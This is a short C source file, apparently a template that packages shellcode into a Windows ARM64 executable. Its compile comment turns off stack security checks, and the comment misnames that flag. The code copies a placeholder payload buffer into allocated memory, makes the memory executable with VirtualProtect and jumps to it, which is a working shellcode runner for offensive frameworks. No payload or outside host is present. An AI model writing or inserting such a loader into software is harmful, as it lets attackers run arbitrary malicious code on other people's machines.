// Compilation
// /FA = Create assembly listing
// /GA- = Disable security checks
// "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\bin\HostArm64\arm64\CL.exe" /FA /GS- template_aarch64_windows.c /link /subsystem:windows /defaultlib:"C:\Program Files (x86)\Windows Kits\10\Lib\10.0.26100.0\um\arm64\kernel32.Lib" /subsystem:WINDOWS /entry:main

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#undef WIN32_LEAN_AND_MEAN

#define SCSIZE 4096
char payload[SCSIZE] = "PAYLOAD:";

int main(int argc, char** argv) {
	void* exec = VirtualAlloc(0, SCSIZE, MEM_COMMIT, PAGE_READWRITE);

	for (int i = 0; i < SCSIZE; i++) {
		((char*)exec)[i] = payload[i];
	}

	DWORD oldProtection;
	VirtualProtect(
		exec,
		SCSIZE,
		PAGE_EXECUTE,
		&oldProtection
	);

	((void(*)())exec)();

	ExitProcess(0);

	return 0;
}
